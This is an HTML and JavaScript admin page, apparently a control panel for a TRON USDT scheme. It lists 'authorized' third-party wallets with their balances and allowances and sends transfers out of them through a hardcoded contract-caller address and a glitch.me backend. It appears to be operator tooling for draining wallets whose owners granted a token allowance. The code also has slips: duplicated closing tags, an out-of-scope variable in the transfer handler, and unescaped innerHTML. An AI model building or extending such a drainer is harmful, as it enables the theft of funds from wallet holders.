<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON USDT 管理面板</title>
    <link rel="manifest" href="manifest.json">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            padding-top: 20px;
        }
        .wallet-card {
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }
        .wallet-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }
        .status-online {
            background-color: #28a745;
        }
        .status-offline {
            background-color: #dc3545;
        }
        .status-warning {
            background-color: #ffc107;
        }
        #trxBalanceWarning {
            display: none;
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }
        .loading {
            position: relative;
        }
        .loading:after {
            content: '';
            position: absolute;
            width: 20px;
            height: 20px;
            top: 50%;
            left: 50%;
            margin-top: -10px;
            margin-left: -10px;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .transfer-status {
            font-size: 0.9em;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row mb-4">
            <div class="col-12">
                <div class="d-flex justify-content-between align-items-center">
                    <h2>TRON USDT 管理面板</h2>
                    <div class="d-flex align-items-center">
                        <div class="status-indicator" id="systemStatus"></div>
                        <span id="statusText">連接中...</span>
                    </div>
                </div>
            </div>
        </div>

        <div class="alert alert-warning" id="trxBalanceWarning" role="alert">
            合約調用者 TRX 餘額過低！
        </div>

        <div class="row mb-3">
            <div class="col-12">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">合約調用者狀態</h5>
                        <p class="card-text">
                            地址: <span id="contractOwnerAddress">-</span><br>
                            TRX 餘額: <span id="contractOwnerBalance">-</span>
                        </p>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mb-3">
            <div class="col-12">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">已授權錢包列表</h5>
                        <div id="walletList" class="mt-3">
                            <!-- 錢包列表將在這裡動態生成 -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- 轉帳確認模態框 -->
    <div class="modal fade" id="transferModal" tabindex="-1">
        <div class="modal-dialog modal-sm">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">確認轉帳</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label for="transferAmount" class="form-label">轉帳金額 (USDT)</label>
                        <input type="number" class="form-control" id="transferAmount" min="0" step="1">
                    </div>
                    <div class="transfer-status" id="transferStatus"></div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
                    <button type="button" class="btn btn-primary" id="confirmTransfer">確認轉帳</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <script>
        // 全局變量
        let currentWallet = null;
        let transferModal = null;
        let socket = null;
        const API_BASE_URL = 'https://spectacular-wholesale-sprint.glitch.me';
        const CONTRACT_OWNER = 'THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR';

        // 初始化
        document.addEventListener('DOMContentLoaded', async () => {
            // 初始化 Bootstrap 模態框
            transferModal = new bootstrap.Modal(document.getElementById('transferModal'));
            
            // 初始化 WebSocket
            initializeWebSocket();
            
            // 顯示合約調用者地址
            document.getElementById('contractOwnerAddress').textContent = CONTRACT_OWNER;
            
            // 開始定期更新
            await refreshData();
            setInterval(refreshData, 60000); // 每分鐘更新一次
            
            // 註冊 Service Worker
            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register('/service-worker.js');
                    console.log('ServiceWorker registration successful');
                } catch (err) {
                    console.log('ServiceWorker registration failed: ', err);
                }
            }
        });

        // 初始化 WebSocket
        function initializeWebSocket() {
            socket = io(API_BASE_URL);

            socket.on('connect', () => {
                updateSystemStatus(true);
            });

            socket.on('disconnect', () => {
                updateSystemStatus(false);
            });

            socket.on('trx-balance-warning', (data) => {
                showTrxBalanceWarning(data);
            });

            socket.on('transfer-started', (data) => {
                updateTransferStatus(data.fromAddress, '轉帳開始處理...');
            });

            socket.on('transfer-confirmed', (data) => {
                updateTransferStatus(data.fromAddress, '轉帳成功！');
                refreshData();
            });

            socket.on('transfer-failed', (data) => {
                updateTransferStatus(data.fromAddress, `轉帳失敗: ${data.error}`);
            });
        }

        // 更新系統狀態指示器
        function updateSystemStatus(isOnline) {
            const indicator = document.getElementById('systemStatus');
            const statusText = document.getElementById('statusText');
            
            indicator.className = 'status-indicator ' + (isOnline ? 'status-online' : 'status-offline');
            statusText.textContent = isOnline ? '系統在線' : '系統離線';
        }

        // 顯示 TRX 餘額警告
        function showTrxBalanceWarning(data) {
            const warning = document.getElementById('trxBalanceWarning');
            warning.textContent = `警告：合約調用者 TRX 餘額過低！當前：${data.balance} TRX`;
            warning.style.display = 'block';
            setTimeout(() => {
                warning.style.display = 'none';
            }, 5000);
        }

        // 刷新數據
        async function refreshData() {
            try {
                // 更新合約調用者餘額
                const ownerBalance = await fetch(`${API_BASE_URL}/contract-owner-balance`).then(r => r.json());
                document.getElementById('contractOwnerBalance').textContent = `${ownerBalance.balance} TRX`;

                // 更新錢包列表
                const wallets = await fetch(`${API_BASE_URL}/authorized-wallets`).then(r => r.json());
                updateWalletList(wallets);
            } catch (error) {
                console.error('Error refreshing data:', error);
                updateSystemStatus(false);
            }
        }

        // 更新錢包列表
        function updateWalletList(wallets) {
            const walletList = document.getElementById('walletList');
            walletList.innerHTML = '';

            wallets.forEach(wallet => {
                const card = document.createElement('div');
                card.className = 'card wallet-card';
                card.innerHTML = `
                    <div class="card-body">
                        <h6 class="card-subtitle mb-2 text-muted">錢包地址：${wallet.address}</h6>
                        <p class="card-text">
                            USDT 餘額：${wallet.balance}<br>
                            授權額度：${wallet.allowance}
                        </p>
                        <button class="btn btn-primary btn-sm" onclick="showTransferModal('${wallet.address}')">
                            轉帳
                        </button>
                        <div class="transfer-status" id="status_${wallet.address}"></div>
                    </div>
                `;
                walletList.appendChild(card);
            });
        }

        // 顯示轉帳模態框
        function showTransferModal(address) {
            currentWallet = address;
            document.getElementById('transferAmount').value = '';
            document.getElementById('transferStatus').textContent = '';
            transferModal.show();
        }

        // 更新轉帳狀態
        function updateTransferStatus(address, message) {
            const statusElement = document.getElementById(`status_${address}`);
            if (statusElement) {
                statusElement.textContent = message;
            }
            const modalStatus = document.getElementById('transferStatus');
            if (modalStatus && currentWallet === address) {
                modalStatus.textContent = message;
            }
        }

        // 確認轉帳按鈕事件
        document.getElementById('confirmTransfer').addEventListener('click', async () => {
            const amount = document.getElementById('transferAmount').value;
            if (!amount || amount <= 0) {
                alert('請輸入有效的轉帳金額');
                return;
            }

            try {
                const button = document.getElementById('confirmTransfer');
                button.disabled = true;
                button.classList.add('loading');

                const response = await fetch(`${API_BASE_URL}/transfer`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        fromAddress: currentWallet,
                        amount: amount
                    })
                });

                const result = await response.json();
                if (result.success) {
                    updateTransferStatus(currentWallet, '交易已發送，等待確認...');
                } else {
                    updateTransferStatus(currentWallet, `錯誤：${result.error}`);
                }
            } catch (error) {
                console.error('Transfer error:', error);
                updateTransferStatus(currentWallet, '轉帳請求失敗');
            } finally {
                button.disabled = false;
                button.classList.remove('loading');
            }
        });
    </script>
</body>
</html>
    </script>
</body>
</html>
